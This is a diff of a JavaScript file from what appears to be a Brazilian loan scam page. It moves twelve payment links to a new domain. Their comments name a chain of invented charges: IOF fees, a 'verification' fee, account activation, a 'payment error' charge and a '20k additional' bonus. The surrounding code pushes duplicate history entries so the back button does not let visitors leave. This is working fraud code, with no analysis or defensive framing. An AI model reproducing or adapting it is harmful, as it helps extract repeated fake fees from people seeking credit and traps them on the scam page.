@@ -1,17 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.terminar-hj.fun/nOzxZooQq9xZJ07", // IOF
-    up2: "https://pay.terminar-hj.fun/q510ZOb0nk83E9D", // Taxa de verificação de IOF
-    up3: "https://pay.terminar-hj.fun/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.terminar-hj.fun/RmA83Ea2q8r3PVp", // NFe
-    up5: "https://pay.terminar-hj.fun/nOzxZooQqQVZJ07", // Ativar conta
-    up6: "https://pay.terminar-hj.fun/NDr8gmKnanpZBmj", // Taxa de registro do contrato
-    up7: "https://pay.terminar-hj.fun/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
-    up8: "https://pay.terminar-hj.fun/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
-    up9: "https://pay.terminar-hj.fun/meABG9dn7DAZ6Ea", // APP - 11,99
-    up10:"https://pay.terminar-hj.fun/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.terminar-hj.fun/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.terminar-hj.fun/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92
-
+    up1: "https://pay.impor-hj.fun/nOzxZooQq9xZJ07", // IOF
+    up2: "https://pay.impor-hj.fun/q510ZOb0nk83E9D", // Taxa de verificação de IOF
+    up3: "https://pay.impor-hj.fun/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.impor-hj.fun/RmA83Ea2q8r3PVp", // NFe
+    up5: "https://pay.impor-hj.fun/nOzxZooQqQVZJ07", // Ativar conta
+    up6: "https://pay.impor-hj.fun/NDr8gmKnanpZBmj", // Taxa de registro do contrato
+    up7: "https://pay.impor-hj.fun/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
+    up8: "https://pay.impor-hj.fun/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
+    up9: "https://pay.impor-hj.fun/meABG9dn7DAZ6Ea", // APP - 11,99
+    up10:"https://pay.impor-hj.fun/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.impor-hj.fun/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.impor-hj.fun/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92
 
 };
 
@@ -60,4 +59,5 @@ function redirect(key) {
 
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
+
 history.pushState({}, '', location.href);
